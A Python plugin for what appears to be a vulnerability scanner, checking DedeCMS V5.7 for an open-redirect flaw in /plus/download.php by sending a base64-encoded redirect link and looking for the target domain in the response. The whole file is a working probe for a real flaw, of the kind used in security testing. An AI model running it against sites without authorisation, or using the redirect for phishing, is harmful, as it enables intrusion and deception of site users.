#!/usr/bin/env python
# -*- coding: utf-8 -*-

from script.lib import logger
from script.lib import requests

name = "dedecms download.php重定向漏洞"
author = "SpongeB0B"
scope = "DedeCMS V5.7"
description = "/plus/download.php 重定向漏洞(中67行存在的代码，即接收参数后未进行域名的判断就进行了跳转)"
reference = "https://www.seebug.org/vuldb/ssvid-62312"
options = [
    {
        "Name": "URL",
        "Current Setting": "",
        "Required": True,
        "Description": "网站地址"
    }
]
def exploit(url):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/plus/download.php?open=1&link=aHR0cHM6Ly93d3cuYmFpZHUuY29t"
        vulnurl = url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10)
            req.close()
            if r"www.baidu.com" in req.content:
                logger.success("[+]存在dedecms download.php重定向漏洞...(低危)\tpayload: "+vulnurl)
            return vulnurl
        except:
            logger.error("[-] "+vulnurl+"====>连接超时")
            pass
